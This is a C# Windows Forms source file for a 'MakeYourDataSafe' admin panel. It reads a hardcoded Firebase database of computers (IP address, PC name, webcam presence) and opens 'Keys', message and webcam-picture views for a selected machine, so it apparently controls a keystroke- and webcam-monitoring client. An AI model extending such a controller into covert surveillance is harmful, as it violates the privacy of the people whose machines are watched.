using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Firebase.Database;
using Firebase.Kecske;
using System.Security.Cryptography;
using Firebase.Database.Query;

namespace MakeYourDataSafe_Admin
{
    public partial class Main : Form
    {
        public Main()
        {
            InitializeComponent();
        }

        private const string database = "https://myds-5f6f8.firebaseio.com/";
        private FirebaseClient client = new FirebaseClient(database);
        private void Form1_Load(object sender, EventArgs e)
        {
            Init();
        }

        private async Task Init()
        {
            try
            {
                var data = await client.Child("Computers").OnceAsync<GetComputers>();
                byte[] imageArray = System.IO.File.ReadAllBytes(@"C:\Users\gerny_pk5\Desktop\asd.png");
                var child = client.Child("Pictures");
                child.PostAsync(new SetPictures { id = "-L_Dr-eEg2N1KjPy9LIp", img = Convert.ToBase64String(imageArray) });
                foreach (var i in data)
                {
                    this.Computers.Rows.Add(i.Key, i.Object.ip_address, i.Object.pc_name, i.Object.has_webcam);
                }
            }
            catch (DataException ex)
            {
                MessageBox.Show(ex.Message);
            }
            catch (FirebaseException ex)
            {
                MessageBox.Show("Hiba az adatbázissal.\r\n" + ex.Message);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Nem várt hiba történt.\r\n" + ex.Message);
            }
        }

        private void keys_Click(object sender, EventArgs e)
        {
            
            Keys form = new Keys(Computers.SelectedCells[0].Value.ToString());
            form.Show();
        }

        private void rowChange(object sender, EventArgs e)
        {
            
        }

        private void msg_Click(object sender, EventArgs e)
        {
            Message form = new Message(Computers.SelectedCells[0].Value.ToString());
            form.Show();
        }

        private void web_Click(object sender, EventArgs e)
        {
            Picviewer form = new Picviewer(Computers.SelectedCells[0].Value.ToString(), 3);
            form.Show();
        }
    }
}
